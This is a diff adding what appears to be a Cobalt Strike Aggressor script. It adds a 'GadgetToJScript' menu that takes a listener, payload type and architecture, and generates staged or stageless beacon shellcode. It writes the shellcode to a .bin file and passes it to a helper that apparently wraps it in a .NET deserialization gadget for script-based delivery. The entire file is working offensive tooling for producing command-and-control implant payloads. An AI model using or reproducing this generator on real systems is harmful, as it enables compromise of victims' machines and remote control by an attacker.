@@ -1,0 +1,58 @@
+$toolpath = "";
+$outpath = "";
+$python3 = "";
+$gzip = "";
+$mcs = "";
+
+
+menubar("Custom Payloads", "custom_payloads");
+
+popup custom_payloads {
+	item "&GadgetToJScript" {
+		GadgetToJScript();
+	}
+}
+
+sub GadgetToJScript {
+	$dialog = dialog("GadgetToJScript Payload Generator", %(listener => "", payload_type => "Payload Type: ", output => "output: "), &GadgetToJScriptCallback);
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged", "Stageless"));
+	drow_combobox($dialog, "architecture", "Architecture: ", @("x64", "x86"));
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+sub GadgetToJScriptCallback {
+	if ($3['listener'] eq "") {
+		show_message("No listener specified!");
+		exit();
+	}
+
+	println("\n\c8[!]\o Generating GadgetToJScript payload...");
+	println("[*] Type: " . $3['payload_type']);
+	println("[*] Architecture: " . $3['architecture']);
+
+	if ($3['payload_type'] eq "Staged") {
+		$shellcode = stager($3['listener'], $3['architecture']);
+	}
+
+	else {
+		$shellcode = artifact_payload($3['listener'], "raw", $3['architecture']);
+	}
+
+	mkdir($outpath);
+	$shellcodefile = openf(">" . $outpath . "/GadgetToJScript.bin");
+	writeb($shellcodefile, $shellcode);
+	closef($shellcodefile);
+	$pythonprocess = exec($python3 . " " . $toolpath . "/" . "Helper.py " . $3['architecture'] . " " . $toolpath . " " . $outpath . " " . $gzip . " " . $mcs);
+	@pythondata = readAll($pythonprocess);
+	printAll(@pythondata);
+	println();
+}
+
+println("\n\c9[+]\o Loaded GadgetToJScript.cna!");
+println("\c8[!]\o \$toolpath set to '\U$toolpath\U'");
+println("\c8[!]\o \$outpath set to '\U$outpath\U'");
+println("\c8[!]\o \$python3 set to '\U$python3\U'");
+println("\c8[!]\o \$gzip set to '\U$gzip\U'");
+println("\c8[!]\o \$mcs set to '\U$mcs\U'\n");
